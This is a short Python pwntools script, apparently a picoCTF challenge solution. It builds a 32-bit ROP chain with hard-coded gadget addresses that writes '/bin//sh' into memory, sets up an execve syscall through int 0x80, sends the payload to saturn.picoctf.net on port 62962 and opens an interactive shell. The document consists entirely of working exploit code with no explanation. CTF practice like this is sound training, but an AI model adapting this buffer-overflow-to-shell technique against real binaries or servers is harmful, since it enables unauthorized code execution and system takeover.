from pwn import *

# Padding goes here
p = b"A" * 28

p += p32(0x080583C9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5060)  # @ .data
p += p32(0x41414141)  # padding
p += p32(0x080B074A)  # pop eax ; ret
p += b"/bin"
p += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
p += p32(0x080583C9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5064)  # @ .data + 4
p += p32(0x41414141)  # padding
p += p32(0x080B074A)  # pop eax ; ret
p += b"//sh"
p += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
p += p32(0x080583C9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x41414141)  # padding
p += p32(0x0804FB90)  # xor eax, eax ; ret
p += p32(0x08059102)  # mov dword ptr [edx], eax ; ret
p += p32(0x08049022)  # pop ebx ; ret
p += p32(0x080E5060)  # @ .data
p += p32(0x08049E39)  # pop ecx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x080583C9)  # pop edx ; pop ebx ; ret
p += p32(0x080E5068)  # @ .data + 8
p += p32(0x080E5060)  # padding without overwrite ebx
p += p32(0x0804FB90)  # xor eax, eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0808055E)  # inc eax ; ret
p += p32(0x0804A3D2)  # int 0x80

q = remote("saturn.picoctf.net", 62962)
print(q.recv(1000))
q.send(p)
q.recvall
q.interactive()
q.close()
